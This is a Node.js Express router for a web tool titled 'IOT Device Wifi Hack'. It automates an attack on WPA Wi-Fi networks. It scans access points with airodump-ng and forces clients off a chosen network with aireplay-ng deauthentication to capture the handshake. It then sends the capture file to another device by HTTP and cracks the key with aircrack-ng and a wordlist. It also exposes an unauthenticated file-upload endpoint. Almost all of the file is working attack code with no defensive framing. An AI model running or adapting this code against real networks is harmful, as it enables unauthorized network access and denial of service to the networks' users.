var express = require('express');
var router = express.Router();
var spawn = require('child_process').spawn;
const Parser = require('./parser');
var fs = require('fs');
var path = require('path');
var request = require('request');

const parser = new Parser('airodump');
class Data {
  constructor({handshake = '', aps = [], stations = []} = {}) {
    this.handshake = handshake;
    this.aps = aps;
    this.stations = stations;
  }
}

var cdata = new Data();

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { log: 'true', wifi: 'false', handshake: 'false', title: "IOT Device Wifi Hack"});
});

// get log file
router.get('/log', function(req, res, next) {
  fs.readFile('log.txt', (err, data) => {
    if (err) {
      console.error(err)
    }
    if (data) {
      log = data.toString();
      log = log.replace(/\n?\r\n/g, '<br />' );
      console.log(log)
      res.render('index', { log: 'true', wifi: 'false', handshake: 'false', title: "IOT Device Wifi Hack", data: log});
    }
  })
});

// return device status page
router.get('/device', function(req, res, next) {
  // there is default to iot_device1
  res.render('index', { wifi: 'false', handshake: 'false', device: 'true', deviceId: 'monster', title: "IOT Device Wifi Hack"});
});

// searching
router.get('/search', function(req, res, next) {
  fs.writeFile('log.txt', 'User ask to get WIFI'+'\r\n', function (err) {
    if (err) throw err;
    console.log('log file created')
  });
  getWifi((data)=>{res.render('index', { wifi: 'true', handshake: 'false', title: "IOT Device Wifi Hack", data: data});});
});

//acctack a certain BSSID, CH
router.post('/search', function(req, res, next) {
  fs.appendFile('log.txt', 'receives attack information'+'\r\n', function (err) {
    if (err) throw err;
  });
  fs.appendFile('log.txt', 'BSSID: ' + req.body.BSSID+'\r\n', function (err) {
    if (err) throw err;
  });
  fs.appendFile('log.txt', 'CH: ' + req.body.CH+'\r\n', function (err) {
    if (err) throw err;
  });
  firstAttack(req.body.BSSID, req.body.CH, function(){
    fs.rename('./wificrack-01.cap', './wificrack.cap', function (err) {
      if (err) res.render('index', { wifi: 'true', handshake: 'false', title: "IOT Device Wifi Hack", data: 'does not have handshake file, please search and attack again'});
      else {
        console.log('Successfully renamed!');
        fs.unlink('./wificrack-01.csv', function (err) {
          console.log('wificrack-01.csv removed!');
          });
        fs.unlink('./wificrack-01.kismet.csv', function (err) {
          console.log('wificrack-01.kismet.csv removed!');
          });
        fs.unlink('./wificrack-01.kismet.netxml', function (err) {
          console.log('wificrack-01.kismet.netxml removed!');
          });
        fs.unlink('./wificrack-01.log.csv', function (err) {
          console.log('wificrack-01.log.csv removed!');
          });
        fs.appendFile('log.txt', ' handshake file get successfully '+'\r\n', function (err) {
          if (err) throw err;
        });
        res.render('index', { wifi: 'true', handshake: 'true', title: "IOT Device Wifi Hack", data: 'handshake file get successfully '});
      }
    });
  });
});

// this function is used on iot deives......
router.post('/:filename', function (req, res) {
  var filename = path.basename(req.params.filename);
  filename = path.resolve(__dirname, filename);
  var dst = fs.createWriteStream(filename);
  req.pipe(dst);
  dst.on('drain', function() {
    console.log('drain', new Date());
    req.resume();
  });
  req.on('end', function () {
    runattack(function(key){
      res.send(key);
    });
  });
});

// send handshake file to other devices
router.get('/attack', function(req, res, next) {
  fs.appendFile('log.txt', 'send out 4-way handshake file to IoT nodes'+'\r\n', function (err) {
    if (err) throw err;
  });
  sendFile(function(key) {
    res.render('index', { wifi: 'true', handshake: 'true', key: 'true', title: "IOT Device Wifi Hack", data: key});
  });
});

// run attck 
function runattack(back) {

  // this command is only working on windows
  // I use a one for default
  var key = "";
  var cmd = spawn('aircrack-ng', ['-b', 'A4:56:CC:4A:E1:3A', '-q', '-w', './routes/password.txt', './routes/wificrack.cap'], {shell: true});
  // this command works on linux
  // var cmd = spawn('aircrack-ng', ['-w', 
  // 'password.txt', 'wificrack.cap']);

  cmd.stdout.on('data', (data) => {
    if(data.toString().includes("KEY NOT FOUND")) {
      console.log("got it");
      key = data.toString();
    } else {
      console.log("key found!");
      key = data.toString();
    }
  });

  cmd.on('close', function (code) {
    console.log('attack exited with code ' + code + ' in first attack');
    back(key);
  });

}

// help function to send file
function sendFile(back) {
  var filename = 'wificrack.cap';
  var target = 'http://10.0.0.225:3000/' + path.basename(filename);
  var rs = fs.createReadStream(filename);
  var ws = request.post(target,
                        (error, res, body) => {
                        if (error) {
                          console.error(error)
                          return
                        }
                        console.log(body);
                        back(body);
                        });
  ws.on('drain', function () {
    console.log('drain', new Date());
    rs.resume();
  });
  rs.on('end', function () {
    console.log('uploaded to ' + target);
  });
  ws.on('error', function (err) {
    console.error('cannot send file to ' + target + ': ' + err);
  });
  rs.pipe(ws);
}

// help function
function addData({handshake = '', aps = [], stations = []} = {}) {
  if(aps.length != 0) {
    cdata.aps = aps;
  }
}

// help function on first connection with Router
function firstAttack(bssid, ch, back) {
  fs.appendFile('log.txt', 'first connection ....'+'\r\n', function (err) {
    if (err) throw err;
  });
  deauthE = false;
  var cmd = spawn('airodump-ng', ['wlan1', 
  '--bssid', bssid, '-c', ch, '-w', 'wificrack']);
  cmd.stderr.on('data', (data) => {
    let handshaker = parser.parse(data.toString()).handshake;
    if(handshaker === '' | handshaker == undefined) {
      if(deauthE === false) {
        fs.appendFile('log.txt', 'deauth starts ....'+'\r\n', function (err) {
          if (err) throw err;
        });
        deauthE = true;
        var deauth = spawn('aireplay-ng', ['--deauth', 
        '10', '-a', bssid, 'wlan1']);
        deauth.on('close', function (code) {
          fs.appendFile('log.txt', 'deauth closed ....'+'\r\n', function (err) {
            if (err) throw err;
          });
          console.log('deauth closed ' + code + ' in attack');
        });
      }
    } else {
      console.log(parser.parse(data.toString()).handshake)
      cmd.kill();
      back();
    }
  });

  cmd.on('close', function (code) {
    console.log('cmd exited with code ' + code + ' in first attack');
  });
}

function getWifi(back) {
  console.log('getting wifi');
  var cmd = spawn('airodump-ng', ['wlan1']);
  cmd.stderr.on('data', (data) => {
    addData(parser.parse(data.toString()));
    console.log(JSON.stringify(cdata));
  });

  cmd.on('close', function (code) {
  console.log('child process exited with code ' + code + '. Make sure your wifi device is set to monitor mode.');
});
  setTimeout(() => {
    cmd.kill();
    back(JSON.stringify(cdata.aps));
  }, 30000);
}

module.exports = router;
